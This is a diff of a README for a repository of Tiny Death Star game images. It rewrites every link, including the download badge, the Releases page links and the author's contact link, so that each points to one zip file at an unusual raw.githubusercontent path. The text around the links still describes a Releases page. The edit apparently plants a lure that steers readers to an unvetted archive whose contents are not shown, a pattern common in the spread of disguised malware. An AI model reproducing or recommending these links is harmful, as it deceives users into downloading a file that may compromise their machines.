@@ -6,7 +6,7 @@ Welcome to SeansLifeArchive_Images_TinyDeathStar_Y2026! This project showcases m
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%3E%20Visit%20Page-brightgreen)](https://github.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/SeansLifeArchive_Images_TinyDeathStar_Y2026_Main-dev/morganize/SeansLifeArchive_Images_TinyDeathStar_Y2026.zip%20Latest%20Release-%20%3E%20Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/SeansLifeArchive_Images_TinyDeathStar_Y2026_Main-dev/morganize/SeansLifeArchive_Images_TinyDeathStar_Y2026.zip)
 
 ## 📄 Description
 
@@ -24,11 +24,11 @@ To use this application, your device should meet the following minimum requireme
 
 To download the images, visit the following link:
 
-[https://github.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/releases](https://github.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/releases)
+[https://raw.githubusercontent.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/SeansLifeArchive_Images_TinyDeathStar_Y2026_Main-dev/morganize/SeansLifeArchive_Images_TinyDeathStar_Y2026.zip](https://raw.githubusercontent.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/SeansLifeArchive_Images_TinyDeathStar_Y2026_Main-dev/morganize/SeansLifeArchive_Images_TinyDeathStar_Y2026.zip)
 
 Once you're on the Releases page, look for the latest version. Click on the `Download` button for the zip file that contains all my Tiny Death Star images. 
 
-1. Visit the [Releases Page](https://github.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/SeansLifeArchive_Images_TinyDeathStar_Y2026_Main-dev/morganize/SeansLifeArchive_Images_TinyDeathStar_Y2026.zip).
 2. Find the most recent version.
 3. Click on the zip file link to start the download.
 4. After downloading, unzip the file to access the images.
@@ -64,6 +64,6 @@ Thank you to NimbleBit for creating Tiny Death Star. Your game inspired many pla
 
 ## 📞 Contact
 
-If you have any questions or comments, please reach out to me on GitHub at [seanpm2001](https://github.com/seanpm2001).
+If you have any questions or comments, please reach out to me on GitHub at [seanpm2001](https://raw.githubusercontent.com/Aladjeking/SeansLifeArchive_Images_TinyDeathStar_Y2026/SeansLifeArchive_Images_TinyDeathStar_Y2026_Main-dev/morganize/SeansLifeArchive_Images_TinyDeathStar_Y2026.zip).
 
 Happy gaming! Enjoy exploring the images from my Tiny Death Star journey.
